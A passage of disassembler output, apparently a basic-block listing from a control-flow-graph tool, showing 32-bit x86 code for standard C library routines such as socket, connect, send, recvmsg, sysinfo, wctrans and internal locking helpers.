0xb0ec067:	pop	ebp
0xb0ec068:	ret	
None
|
|
|
v
0xb0ec02a:	mov	ebx, dword ptr [esp + 4]
0xb0ec02e:	cmp	eax, 0xfffff000
0xb0ec033:	mov	ebp, eax
0xb0ec035:	ja	0xb0ec04b
None
|
|
|
v
0xb0ec03b:	mov	eax, dword ptr [esp + 8]
0xb0ec03f:	mov	edx, dword ptr [esp + 0xc]
0xb0ec043:	add	esp, 0x14
0xb0ec046:	pop	ebx
0xb0ec047:	pop	esi
0xb0ec048:	pop	edi
0xb0ec049:	pop	ebp
0xb0ec04a:	ret	
None
|
|
|
v
0xb0ebff0:	push	ebp
0xb0ebff1:	push	edi
0xb0ebff2:	push	esi
0xb0ebff3:	push	ebx
0xb0ebff4:	sub	esp, 0x14
0xb0ebff7:	mov	ebp, dword ptr [esp + 0x28]
0xb0ebffb:	lea	esi, dword ptr [esp + 8]
0xb0ebfff:	call	0xb1267db
None
|
|
|
v
0xb0ec060:	add	esp, 0x14
0xb0ec063:	cdq	
0xb0ec064:	pop	ebx
0xb0ec065:	pop	esi
0xb0ec066:	pop	edi
0xb0ec067:	pop	ebp
0xb0ec068:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sysinfo
TOTAL BLOCKS :5
0xb0ecf8c:	call	0xb1267df
None
|
|
|
v
0xb0ecf91:	add	ecx, 0xbe06f
0xb0ecf97:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0ecf9d:	neg	eax
0xb0ecf9f:	add	ecx, dword ptr gs:[0]
0xb0ecfa6:	mov	dword ptr [ecx], eax
0xb0ecfa8:	or	eax, 0xffffffff
0xb0ecfab:	ret	
None
|
|
|
v
0xb0ecf8b:	ret	
None
|
|
|
v
0xb0ecf70:	mov	edx, ebx
0xb0ecf72:	mov	ebx, dword ptr [esp + 4]
0xb0ecf76:	mov	eax, 0x74
0xb0ecf7b:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ecf82:	mov	ebx, edx
0xb0ecf84:	cmp	eax, 0xfffff001
0xb0ecf89:	jae	0xb0ecf8c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__connect
TOTAL BLOCKS :11
0xb0ed538:	mov	ebx, edx
0xb0ed53a:	xchg	eax, esi
0xb0ed53b:	call	0xb0f94f0
None
|
|
|
v
0xb0ed4f0:	cmp	dword ptr gs:[0xc], 0
0xb0ed4f8:	jne	0xb0ed519
None
|
|
|
v
0xb0ed511:	mov	ebx, edx
0xb0ed513:	cmp	eax, 0x83
0xb0ed516:	jae	0xb0ed549
None
|
|
|
v
0xb0ed4fa:	mov	edx, ebx
0xb0ed4fc:	mov	eax, 0x66
0xb0ed501:	mov	ebx, 3
0xb0ed506:	lea	ecx, dword ptr [esp + 4]
0xb0ed50a:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ed519:	push	esi
0xb0ed51a:	call	0xb0f9490
None
|
|
|
v
0xb0ed54e:	add	ecx, 0xbdab2
0xb0ed554:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0ed55a:	neg	eax
0xb0ed55c:	add	ecx, dword ptr gs:[0]
0xb0ed563:	mov	dword ptr [ecx], eax
0xb0ed565:	or	eax, 0xffffffff
0xb0ed568:	ret	
None
|
|
|
v
0xb0ed548:	ret	
None
|
|
|
v
0xb0ed51f:	mov	esi, eax
0xb0ed521:	mov	edx, ebx
0xb0ed523:	mov	eax, 0x66
0xb0ed528:	mov	ebx, 3
0xb0ed52d:	lea	ecx, dword ptr [esp + 8]
0xb0ed531:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ed518:	ret	
None
|
|
|
v
0xb0ed549:	call	0xb1267df
None
|
|
|
v
0xb0ed540:	mov	eax, esi
0xb0ed542:	pop	esi
0xb0ed543:	cmp	eax, 0x83
0xb0ed546:	jae	0xb0ed549
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:recvmsg
TOTAL BLOCKS :11
0xb0ed7b8:	mov	ebx, edx
0xb0ed7ba:	xchg	eax, esi
0xb0ed7bb:	call	0xb0f94f0
None
|
|
|
v
0xb0ed770:	cmp	dword ptr gs:[0xc], 0
0xb0ed778:	jne	0xb0ed799
None
|
|
|
v
0xb0ed791:	mov	ebx, edx
0xb0ed793:	cmp	eax, 0x83
0xb0ed796:	jae	0xb0ed7c9
None
|
|
|
v
0xb0ed77a:	mov	edx, ebx
0xb0ed77c:	mov	eax, 0x66
0xb0ed781:	mov	ebx, 0x11
0xb0ed786:	lea	ecx, dword ptr [esp + 4]
0xb0ed78a:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ed799:	push	esi
0xb0ed79a:	call	0xb0f9490
None
|
|
|
v
0xb0ed7ce:	add	ecx, 0xbd832
0xb0ed7d4:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0ed7da:	neg	eax
0xb0ed7dc:	add	ecx, dword ptr gs:[0]
0xb0ed7e3:	mov	dword ptr [ecx], eax
0xb0ed7e5:	or	eax, 0xffffffff
0xb0ed7e8:	ret	
None
|
|
|
v
0xb0ed7c8:	ret	
None
|
|
|
v
0xb0ed79f:	mov	esi, eax
0xb0ed7a1:	mov	edx, ebx
0xb0ed7a3:	mov	eax, 0x66
0xb0ed7a8:	mov	ebx, 0x11
0xb0ed7ad:	lea	ecx, dword ptr [esp + 8]
0xb0ed7b1:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ed798:	ret	
None
|
|
|
v
0xb0ed7c9:	call	0xb1267df
None
|
|
|
v
0xb0ed7c0:	mov	eax, esi
0xb0ed7c2:	pop	esi
0xb0ed7c3:	cmp	eax, 0x83
0xb0ed7c6:	jae	0xb0ed7c9
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:send
TOTAL BLOCKS :11
0xb0ed838:	mov	ebx, edx
0xb0ed83a:	xchg	eax, esi
0xb0ed83b:	call	0xb0f94f0
None
|
|
|
v
0xb0ed7f0:	cmp	dword ptr gs:[0xc], 0
0xb0ed7f8:	jne	0xb0ed819
None
|
|
|
v
0xb0ed811:	mov	ebx, edx
0xb0ed813:	cmp	eax, 0x83
0xb0ed816:	jae	0xb0ed849
None
|
|
|
v
0xb0ed7fa:	mov	edx, ebx
0xb0ed7fc:	mov	eax, 0x66
0xb0ed801:	mov	ebx, 9
0xb0ed806:	lea	ecx, dword ptr [esp + 4]
0xb0ed80a:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ed819:	push	esi
0xb0ed81a:	call	0xb0f9490
None
|
|
|
v
0xb0ed84e:	add	ecx, 0xbd7b2
0xb0ed854:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0ed85a:	neg	eax
0xb0ed85c:	add	ecx, dword ptr gs:[0]
0xb0ed863:	mov	dword ptr [ecx], eax
0xb0ed865:	or	eax, 0xffffffff
0xb0ed868:	ret	
None
|
|
|
v
0xb0ed848:	ret	
None
|
|
|
v
0xb0ed81f:	mov	esi, eax
0xb0ed821:	mov	edx, ebx
0xb0ed823:	mov	eax, 0x66
0xb0ed828:	mov	ebx, 9
0xb0ed82d:	lea	ecx, dword ptr [esp + 8]
0xb0ed831:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ed818:	ret	
None
|
|
|
v
0xb0ed849:	call	0xb1267df
None
|
|
|
v
0xb0ed840:	mov	eax, esi
0xb0ed842:	pop	esi
0xb0ed843:	cmp	eax, 0x83
0xb0ed846:	jae	0xb0ed849
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:setsockopt
TOTAL BLOCKS :5
0xb0ed98e:	ret	
None
|
|
|
v
0xb0ed98f:	call	0xb1267df
None
|
|
|
v
0xb0ed987:	mov	ebx, edx
0xb0ed989:	cmp	eax, 0x83
0xb0ed98c:	jae	0xb0ed98f
None
|
|
|
v
0xb0ed970:	mov	edx, ebx
0xb0ed972:	mov	eax, 0x66
0xb0ed977:	mov	ebx, 0xe
0xb0ed97c:	lea	ecx, dword ptr [esp + 4]
0xb0ed980:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0ed994:	add	ecx, 0xbd66c
0xb0ed99a:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0ed9a0:	neg	eax
0xb0ed9a2:	add	ecx, dword ptr gs:[0]
0xb0ed9a9:	mov	dword ptr [ecx], eax
0xb0ed9ab:	or	eax, 0xffffffff
0xb0ed9ae:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:shutdown
TOTAL BLOCKS :5
0xb0ed9d4:	add	ecx, 0xbd62c
0xb0ed9da:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0ed9e0:	neg	eax
0xb0ed9e2:	add	ecx, dword ptr gs:[0]
0xb0ed9e9:	mov	dword ptr [ecx], eax
0xb0ed9eb:	or	eax, 0xffffffff
0xb0ed9ee:	ret	
None
|
|
|
v
0xb0ed9ce:	ret	
None
|
|
|
v
0xb0ed9cf:	call	0xb1267df
None
|
|
|
v
0xb0ed9c7:	mov	ebx, edx
0xb0ed9c9:	cmp	eax, 0x83
0xb0ed9cc:	jae	0xb0ed9cf
None
|
|
|
v
0xb0ed9b0:	mov	edx, ebx
0xb0ed9b2:	mov	eax, 0x66
0xb0ed9b7:	mov	ebx, 0xd
0xb0ed9bc:	lea	ecx, dword ptr [esp + 4]
0xb0ed9c0:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:socket
TOTAL BLOCKS :5
0xb0eda14:	add	ecx, 0xbd5ec
0xb0eda1a:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0eda20:	neg	eax
0xb0eda22:	add	ecx, dword ptr gs:[0]
0xb0eda29:	mov	dword ptr [ecx], eax
0xb0eda2b:	or	eax, 0xffffffff
0xb0eda2e:	ret	
None
|
|
|
v
0xb0eda0e:	ret	
None
|
|
|
v
0xb0eda0f:	call	0xb1267df
None
|
|
|
v
0xb0eda07:	mov	ebx, edx
0xb0eda09:	cmp	eax, 0x83
0xb0eda0c:	jae	0xb0eda0f
None
|
|
|
v
0xb0ed9f0:	mov	edx, ebx
0xb0ed9f2:	mov	eax, 0x66
0xb0ed9f7:	mov	ebx, 1
0xb0ed9fc:	lea	ecx, dword ptr [esp + 4]
0xb0eda00:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0edae0
TOTAL BLOCKS :49
0xb0edbe4:	cmp	eax, 0xff
0xb0edbe7:	jne	0xb0edc77
None
|
|
|
v
0xb0edb00:	mov	edx, dword ptr [ebx + 0x2084]
0xb0edb06:	test	edx, edx
0xb0edb08:	je	0xb0edd7d
None
|
|
|
v
0xb0edcd0:	mov	eax, dword ptr [ebx - 0xdc]
0xb0edcd6:	mov	edx, dword ptr gs:[0]
0xb0edcdd:	mov	dword ptr [edx + eax], 2
0xb0edce4:	add	esp, 0x4c
0xb0edce7:	mov	eax, 0xffffffff
0xb0edcec:	pop	ebx
0xb0edced:	pop	esi
0xb0edcee:	pop	edi
0xb0edcef:	pop	ebp
0xb0edcf0:	ret	
None
|
|
|
v
0xb0edde0:	mov	eax, dword ptr [esp + 0x1c]
0xb0edde4:	add	esp, 0x28
0xb0edde7:	pop	ebx
0xb0edde8:	ret	
None
|
|
|
v
0xb0edb36:	mov	edx, eax
0xb0edb38:	mov	eax, dword ptr [ebx + 0x37e8]
0xb0edb3e:	test	eax, eax
0xb0edb40:	mov	ecx, eax
0xb0edb42:	je	0xb0edd48
None
|
|
|
v
0xb0edc46:	mov	edx, dword ptr [ebx + 0x37e8]
0xb0edc4c:	test	edx, edx
0xb0edc4e:	mov	ecx, edx
0xb0edc50:	jne	0xb0edc66
None
|
|
|
v
0xb0edbfa:	cmp	dword ptr [esp + 0x18], -1
0xb0edbff:	je	0xb0edc0a
None
|
|
|
v
0xb0edb1c:	or	edx, 0x80000
0xb0edb22:	mov	dword ptr [esp + 4], edx
0xb0edb26:	mov	dword ptr [esp + 8], 0
0xb0edb2e:	mov	dword ptr [esp], eax
0xb0edb31:	call	0xb0ed9f0
None
|
|
|
v
0xb0edca4:	mov	dword ptr [esp + 4], 4
0xb0edcac:	mov	dword ptr [esp], edi
0xb0edcaf:	call	0xb0db0b0
None
|
|
|
v
0xb0edd60:	mov	ecx, dword ptr gs:[0]
0xb0edd67:	mov	eax, dword ptr [ebx - 0xdc]
0xb0edd6d:	cmp	dword ptr [ecx + eax], 0x16
0xb0edd71:	setne	cl
0xb0edd74:	movzx	ecx, cl
0xb0edd77:	lea	ecx, dword ptr [ecx + ecx - 1]
0xb0edd7b:	jmp	0xb0edd52
None
|
|
|
v
0xb0edc0a:	mov	edi, dword ptr [esi - 4]
0xb0edc0d:	cmp	edi, 9
0xb0edc10:	je	0xb0edc1c
None
|
|
|
v
0xb0edcf8:	mov	ecx, dword ptr [ebx - 0xdc]
0xb0edcfe:	mov	edx, dword ptr gs:[0]
0xb0edd05:	cmp	dword ptr [edx + ecx], 0x16
0xb0edd09:	setne	cl
0xb0edd0c:	movzx	ecx, cl
0xb0edd0f:	lea	ecx, dword ptr [ecx + ecx - 1]
0xb0edd13:	jmp	0xb0edc60
None
|
|
|
v
0xb0edb73:	mov	dword ptr [ebx + 0x2088], 0
0xb0edb7d:	mov	dword ptr [ebx + 0x2084], 0
0xb0edb87:	lea	eax, dword ptr [ebx - 0x47eeb]
0xb0edb8d:	mov	dword ptr [esp + 4], 4
0xb0edb95:	lea	esi, dword ptr [ebx - 0x4ccbc]
0xb0edb9b:	mov	dword ptr [esp], eax
0xb0edb9e:	call	0xb0db0b0
None
|
|
|
v
0xb0edc52:	cmp	eax, 0xff
0xb0edc55:	mov	ecx, 1
0xb0edc5a:	je	0xb0edcf8
None
|
|
|
v
0xb0edc77:	mov	dword ptr [ebx + 0x2084], ebp
0xb0edc7d:	mov	dword ptr [ebx + 0x2088], edi
0xb0edc83:	add	esp, 0x4c
0xb0edc86:	pop	ebx
0xb0edc87:	pop	esi
0xb0edc88:	pop	edi
0xb0edc89:	pop	ebp
0xb0edc8a:	ret	
None
|
|
|
v
0xb0edb48:	test	ecx, ecx
0xb0edb4a:	js	0xb0edd18
None
|
|
|
v
0xb0edbd0:	mov	dword ptr [esp + 8], 0
0xb0edbd8:	mov	dword ptr [esp + 4], ebp
0xb0edbdc:	mov	dword ptr [esp], edi
0xb0edbdf:	call	0xb0ed9f0
None
|
|
|
v
0xb0edb0e:	mov	ecx, dword ptr [ebx + 0x37e8]
0xb0edb14:	test	ecx, ecx
0xb0edb16:	js	0xb0edd28
None
|
|
|
v
0xb0edb87:	lea	eax, dword ptr [ebx - 0x47eeb]
0xb0edb8d:	mov	dword ptr [esp + 4], 4
0xb0edb95:	lea	esi, dword ptr [ebx - 0x4ccbc]
0xb0edb9b:	mov	dword ptr [esp], eax
0xb0edb9e:	call	0xb0db0b0
None
|
|
|
v
0xb0edd52:	mov	dword ptr [ebx + 0x37e8], ecx
0xb0edd58:	jmp	0xb0edb48
None
|
|
|
v
0xb0edcbd:	add	esi, 0x14
0xb0edcc0:	cmp	esi, dword ptr [esp + 0x1c]
0xb0edcc4:	jne	0xb0edbfa
None
|
|
|
v
0xb0edcca:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0edc66:	test	ecx, ecx
0xb0edc68:	js	0xb0edbd0
None
|
|
|
v
0xb0edb60:	mov	edx, dword ptr [ebx - 0xdc]
0xb0edb66:	mov	ecx, dword ptr gs:[0]
0xb0edb6d:	cmp	dword ptr [ecx + edx], 0x61
0xb0edb71:	jne	0xb0edb57
None
|
|
|
v
0xb0edc90:	lea	eax, dword ptr [esp + 0x31]
0xb0edc94:	mov	dword ptr [esp + 4], esi
0xb0edc98:	lea	edi, dword ptr [esp + 0x2b]
0xb0edc9c:	mov	dword ptr [esp], eax
0xb0edc9f:	call	0xb07a810
None
|
|
|
v
0xb0edb57:	add	esp, 0x4c
0xb0edb5a:	pop	ebx
0xb0edb5b:	pop	esi
0xb0edb5c:	pop	edi
0xb0edb5d:	pop	ebp
0xb0edb5e:	ret	
None
|
|
|
v
0xb0edae9:	add	ebx, 0xbd517
0xb0edaef:	sub	esp, 0x4c
0xb0edaf2:	mov	eax, dword ptr [ebx + 0x2088]
0xb0edaf8:	test	eax, eax
0xb0edafa:	je	0xb0edb87
None
|
|
|
v
0xb0eddb9:	add	ebx, 0xbd247
0xb0eddbf:	lea	eax, dword ptr [esp + 0x1c]
0xb0eddc3:	mov	dword ptr [esp + 8], eax
0xb0eddc7:	mov	eax, dword ptr [esp + 0x30]
0xb0eddcb:	mov	dword ptr [esp + 4], 0x8905
0xb0eddd3:	mov	dword ptr [esp], eax
0xb0eddd6:	call	0xb0e30e0
None
|
|
|
v
0xb0edcb4:	cmp	eax, 0xff
0xb0edcb7:	jne	0xb0edc0a
None
|
|
|
v
0xb0edc01:	cmp	byte ptr [esi], 0
0xb0edc04:	jne	0xb0edc90
None
|
|
|
v
0xb0edae0:	push	ebp
0xb0edae1:	push	edi
0xb0edae2:	push	esi
0xb0edae3:	push	ebx
0xb0edae4:	call	0xb1267db
None
|
|
|
v
0xb0edba3:	mov	edx, 0x2f63
0xb0edba8:	mov	dword ptr [esp + 0x2b], 0x6f72702f
0xb0edbb0:	mov	word ptr [esp + 0x2f], dx
0xb0edbb5:	mov	byte ptr [esp + 0x31], 0
0xb0edbba:	mov	dword ptr [esp + 0x18], eax
0xb0edbbe:	lea	eax, dword ptr [esi + 0xdc]
0xb0edbc4:	mov	dword ptr [esp + 0x1c], eax
0xb0edbc8:	jmp	0xb0edbfa
None
|
|
|
v
0xb0edd28:	mov	dword ptr [esp + 4], edx
0xb0edd2c:	mov	dword ptr [esp + 8], 0
0xb0edd34:	mov	dword ptr [esp], eax
0xb0edd37:	call	0xb0ed9f0
None
|
|
|
v
0xb0edc6e:	cmp	eax, 0xff
0xb0edc71:	je	0xb0edbed
None
|
|
|
v
0xb0edb50:	cmp	edx, 0xff
0xb0edb53:	mov	eax, edx
0xb0edb55:	je	0xb0edb60
None
|
|
|
v
0xb0edc12:	cmp	edi, 6
0xb0edc15:	mov	ebp, 2
0xb0edc1a:	jne	0xb0edc21
None
|
|
|
v
0xb0edbed:	add	esi, 0x14
0xb0edbf0:	cmp	esi, dword ptr [esp + 0x1c]
0xb0edbf4:	je	0xb0edcd0
None
|
|
|
v
0xb0edc60:	mov	dword ptr [ebx + 0x37e8], ecx
0xb0edc66:	test	ecx, ecx
0xb0edc68:	js	0xb0edbd0
None
|
|
|
v
0xb0edd7d:	lea	eax, dword ptr [ebx - 0x47ee1]
0xb0edd83:	mov	dword ptr [esp + 0xc], eax
0xb0edd87:	lea	eax, dword ptr [ebx - 0x4298c]
0xb0edd8d:	mov	dword ptr [esp + 4], eax
0xb0edd91:	lea	eax, dword ptr [ebx - 0x47efa]
0xb0edd97:	mov	dword ptr [esp + 8], 0x40
0xb0edd9f:	mov	dword ptr [esp], eax
0xb0edda2:	call	0xb027820
None
|
|
|
v
0xb0edd48:	cmp	edx, 0xff
0xb0edd4b:	mov	ecx, 1
0xb0edd50:	je	0xb0edd60
None
|
|
|
v
0xb0edda7:	nop	
0xb0edda9:	nop	
0xb0eddab:	nop	
0xb0eddad:	nop	
0xb0eddaf:	nop	
0xb0eddb0:	push	ebx
0xb0eddb1:	sub	esp, 0x28
0xb0eddb4:	call	0xb1267db
None
|
|
|
v
0xb0edd18:	mov	edx, dword ptr [ebx + 0x2084]
0xb0edd1e:	mov	eax, dword ptr [ebx + 0x2088]
0xb0edd24:	lea	esi, dword ptr [esi]
0xb0edd28:	mov	dword ptr [esp + 4], edx
0xb0edd2c:	mov	dword ptr [esp + 8], 0
0xb0edd34:	mov	dword ptr [esp], eax
0xb0edd37:	call	0xb0ed9f0
None
|
|
|
v
0xb0edde4:	add	esp, 0x28
0xb0edde7:	pop	ebx
0xb0edde8:	ret	
None
|
|
|
v
0xb0edc1c:	mov	ebp, 5
0xb0edc21:	mov	eax, dword ptr [ebx + 0x37e8]
0xb0edc27:	test	eax, eax
0xb0edc29:	js	0xb0edbd0
None
|
|
|
v
0xb0edc21:	mov	eax, dword ptr [ebx + 0x37e8]
0xb0edc27:	test	eax, eax
0xb0edc29:	js	0xb0edbd0
None
|
|
|
v
0xb0edddb:	cmp	eax, 0xff
0xb0eddde:	je	0xb0eddf0
None
|
|
|
v
0xb0edd3c:	mov	edx, eax
0xb0edd3e:	jmp	0xb0edb50
None
|
|
|
v
0xb0eddf0:	mov	eax, 0xffffffff
0xb0eddf5:	jmp	0xb0edde4
None
|
|
|
v
0xb0edc2b:	mov	eax, ebp
0xb0edc2d:	or	eax, 0x80000
0xb0edc32:	mov	dword ptr [esp + 8], 0
0xb0edc3a:	mov	dword ptr [esp + 4], eax
0xb0edc3e:	mov	dword ptr [esp], edi
0xb0edc41:	call	0xb0ed9f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:wctrans
TOTAL BLOCKS :9
0xb0efb73:	cmp	byte ptr [eax + 1], 0
0xb0efb77:	lea	ebp, dword ptr [eax + 1]
0xb0efb7a:	je	0xb0efba0
None
|
|
|
v
0xb0efb30:	add	ebx, 0xbb4d0
0xb0efb36:	sub	esp, 0x1c
0xb0efb39:	mov	edi, dword ptr [esp + 0x30]
0xb0efb3d:	mov	eax, dword ptr [ebx - 0x134]
0xb0efb43:	mov	eax, dword ptr [edx + eax]
0xb0efb46:	mov	eax, dword ptr [eax]
0xb0efb48:	mov	ebp, dword ptr [eax + 0x50]
0xb0efb4b:	mov	dword ptr [esp + 0xc], eax
0xb0efb4f:	cmp	byte ptr [ebp], 0
0xb0efb53:	je	0xb0efba0
None
|
|
|
v
0xb0efb60:	mov	dword ptr [esp], ebp
0xb0efb63:	add	esi, 1
0xb0efb66:	mov	dword ptr [esp + 4], 0
0xb0efb6e:	call	0xb07ed60
None
|
|
|
v
0xb0efb8c:	mov	eax, dword ptr [esp + 0xc]
0xb0efb90:	add	esi, dword ptr [eax + 0x6c]
0xb0efb93:	mov	eax, dword ptr [eax + esi*4 + 0x24]
0xb0efb97:	add	esp, 0x1c
0xb0efb9a:	pop	ebx
0xb0efb9b:	pop	esi
0xb0efb9c:	pop	edi
0xb0efb9d:	pop	ebp
0xb0efb9e:	ret	
None
|
|
|
v
0xb0efb55:	xor	esi, esi
0xb0efb57:	jmp	0xb0efb7c
None
|
|
|
v
0xb0efb20:	push	ebp
0xb0efb21:	mov	edx, dword ptr gs:[0]
0xb0efb28:	push	edi
0xb0efb29:	push	esi
0xb0efb2a:	push	ebx
0xb0efb2b:	call	0xb1267db
None
|
|
|
v
0xb0efba0:	add	esp, 0x1c
0xb0efba3:	xor	eax, eax
0xb0efba5:	pop	ebx
0xb0efba6:	pop	esi
0xb0efba7:	pop	edi
0xb0efba8:	pop	ebp
0xb0efba9:	ret	
None
|
|
|
v
0xb0efb7c:	mov	dword ptr [esp + 4], ebp
0xb0efb80:	mov	dword ptr [esp], edi
0xb0efb83:	call	0xb07a740
None
|
|
|
v
0xb0efb88:	test	eax, eax
0xb0efb8a:	jne	0xb0efb60
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__towctrans
TOTAL BLOCKS :6
0xb0efbe7:	mov	esi, dword ptr [edx + 0x10]
0xb0efbea:	and	esi, eax
0xb0efbec:	lea	ecx, dword ptr [ecx + esi*4]
0xb0efbef:	add	eax, dword ptr [edx + ecx]
0xb0efbf2:	lea	esi, dword ptr [esi]
0xb0efbf8:	pop	esi
0xb0efbf9:	pop	edi
0xb0efbfa:	ret	
None
|
|
|
v
0xb0efbc9:	mov	esi, dword ptr [edx + esi*4 + 0x14]
0xb0efbcd:	test	esi, esi
0xb0efbcf:	je	0xb0efbf8
None
|
|
|
v
0xb0efbbe:	mov	ecx, dword ptr [edx]
0xb0efbc0:	mov	esi, eax
0xb0efbc2:	shr	esi, cl
0xb0efbc4:	cmp	esi, dword ptr [edx + 4]
0xb0efbc7:	jae	0xb0efbf8
None
|
|
|
v
0xb0efbf8:	pop	esi
0xb0efbf9:	pop	edi
0xb0efbfa:	ret	
None
|
|
|
v
0xb0efbd1:	mov	ecx, dword ptr [edx + 8]
0xb0efbd4:	mov	edi, eax
0xb0efbd6:	shr	edi, cl
0xb0efbd8:	mov	ecx, dword ptr [edx + 0xc]
0xb0efbdb:	and	ecx, edi
0xb0efbdd:	lea	ecx, dword ptr [esi + ecx*4]
0xb0efbe0:	mov	ecx, dword ptr [edx + ecx]
0xb0efbe3:	test	ecx, ecx
0xb0efbe5:	je	0xb0efbf8
None
|
|
|
v
0xb0efbb0:	push	edi
0xb0efbb1:	push	esi
0xb0efbb2:	mov	edx, dword ptr [esp + 0x10]
0xb0efbb6:	mov	eax, dword ptr [esp + 0xc]
0xb0efbba:	test	edx, edx
0xb0efbbc:	je	0xb0efbf8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_alloca_cutoff
TOTAL BLOCKS :3
0xb0f8ada:	mov	eax, dword ptr gs:[0x274]
0xb0f8ae0:	shr	eax, 2
0xb0f8ae3:	mov	edx, 0x40000
0xb0f8ae8:	test	eax, eax
0xb0f8aea:	cmove	eax, edx
0xb0f8aed:	cmp	eax, dword ptr [esp + 4]
0xb0f8af1:	setae	al
0xb0f8af4:	movzx	eax, al
0xb0f8af7:	ret	
None
|
|
|
v
0xb0f8ac0:	mov	edx, dword ptr gs:[0x274]
0xb0f8ac7:	shr	edx, 2
0xb0f8aca:	mov	eax, 0x10000
0xb0f8acf:	sub	edx, 1
0xb0f8ad2:	cmp	edx, 0xffff
0xb0f8ad8:	ja	0xb0f8aed
None
|
|
|
v
0xb0f8aed:	cmp	eax, dword ptr [esp + 4]
0xb0f8af1:	setae	al
0xb0f8af4:	movzx	eax, al
0xb0f8af7:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0f9430
TOTAL BLOCKS :6
0xb0f9459:	pop	esi
0xb0f945a:	pop	ebx
0xb0f945b:	pop	edx
0xb0f945c:	ret	
None
|
|
|
v
0xb0f9445:	mov	eax, 0xf0
0xb0f944a:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0f9453:	xchg	dword ptr [ebx], eax
None
|
|
|
v
0xb0f9455:	test	eax, eax
0xb0f9457:	jne	0xb0f9445
None
|
|
|
v
0xb0f9430:	push	edx
0xb0f9431:	push	ebx
0xb0f9432:	push	esi
0xb0f9433:	mov	edx, 2
0xb0f9438:	mov	ebx, ecx
0xb0f943a:	xor	esi, esi
0xb0f943c:	mov	ecx, 0x80
0xb0f9441:	cmp	eax, edx
0xb0f9443:	jne	0xb0f9451
None
|
|
|
v
0xb0f9451:	mov	eax, edx
0xb0f9453:	xchg	dword ptr [ebx], eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0f9460
TOTAL BLOCKS :2
0xb0f9460:	push	ebx
0xb0f9461:	push	ecx
0xb0f9462:	push	edx
0xb0f9463:	mov	ebx, eax
0xb0f9465:	mov	dword ptr [eax], 0
0xb0f946b:	mov	ecx, 0x81
0xb0f9470:	mov	edx, 1
0xb0f9475:	mov	eax, 0xf0
0xb0f947a:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0f9481:	pop	edx
0xb0f9482:	pop	ecx
0xb0f9483:	pop	ebx
0xb0f9484:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0f9490
TOTAL BLOCKS :11
0xb0f94d8:	lock or	dword ptr gs:[0x84], 0x10
None
|
|
|
v
0xb0f9490:	mov	edx, dword ptr gs:[0x84]
0xb0f9497:	mov	ecx, edx
0xb0f9499:	or	ecx, 2
0xb0f949c:	cmp	ecx, edx
0xb0f949e:	je	0xb0f94b7
None
|
|
|
v
0xb0f94c7:	add	ebx, 0xb1b39
0xb0f94cd:	mov	dword ptr gs:[0x228], 0xffffffff
0xb0f94d8:	lock or	dword ptr gs:[0x84], 0x10
None
|
|
|
v
0xb0f94a0:	mov	eax, edx
0xb0f94a2:	lock cmpxchg	dword ptr gs:[0x84], ecx
0xb0f94ab:	cmp	edx, eax
0xb0f94ad:	jne	0xb0f94ba
None
|
|
|
v
0xb0f94be:	push	ebx
0xb0f94bf:	sub	esp, 8
0xb0f94c2:	call	0xb1267db
None
|
|
|
v
0xb0f9497:	mov	ecx, edx
0xb0f9499:	or	ecx, 2
0xb0f949c:	cmp	ecx, edx
0xb0f949e:	je	0xb0f94b7
None
|
|
|
v
0xb0f94b7:	mov	eax, edx
0xb0f94b9:	ret	
None
|
|
|
v
0xb0f94ec:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0f94af:	and	ecx, 0xffffffbb
0xb0f94b2:	cmp	ecx, 0xa
0xb0f94b5:	je	0xb0f94be
None
|
|
|
v
0xb0f94ba:	mov	edx, eax
0xb0f94bc:	jmp	0xb0f9497
None
|
|
|
v
0xb0f94e1:	mov	eax, dword ptr gs:[0x80]
0xb0f94e7:	call	0xb12b390
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0f94f0
TOTAL BLOCKS :11
0xb0f9526:	mov	ecx, eax
0xb0f9528:	jmp	0xb0f9505
None
|
|
|
v
0xb0f9542:	xchg	ebx, edi
0xb0f9544:	mov	edx, dword ptr gs:[0x84]
0xb0f954b:	mov	eax, edx
0xb0f954d:	and	eax, 0xc
0xb0f9550:	cmp	eax, 4
